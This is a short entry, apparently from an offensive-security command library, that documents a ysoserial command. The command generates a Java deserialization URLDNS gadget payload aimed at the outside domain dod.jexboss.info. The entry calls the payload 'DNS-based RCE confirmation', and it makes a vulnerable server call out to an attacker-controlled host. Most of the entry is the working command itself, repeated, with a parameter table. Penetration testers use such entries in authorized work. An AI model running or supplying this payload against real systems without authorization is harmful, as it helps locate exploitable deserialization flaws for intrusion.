---
data: >-
  java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod.jexboss.info >
  payload
tags:
  - payload
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:23:27.176Z'
id: 62b0ee46-791e-4f5f-9382-b8c190fee7f4
verified: false
validated: true
submitted: true
---
---

# java-ysoserial-urldns

## Command

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod.jexboss.info > payload
```

## Description

Generates a URLDNS gadget payload for DNS-based RCE confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -jar | Specifies JAR | Yes |
| URLDNS | Gadget type | Yes |
| Domain | DNS target | Yes |
| > payload | Output file | Yes |

## Examples

### Basic Usage

```bash
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod.jexboss.info > payload
```

## Expected Output

Binary data written to 'payload' file.

## Related

- [[Related Procedure: Generate-URLDNS-Payload]]
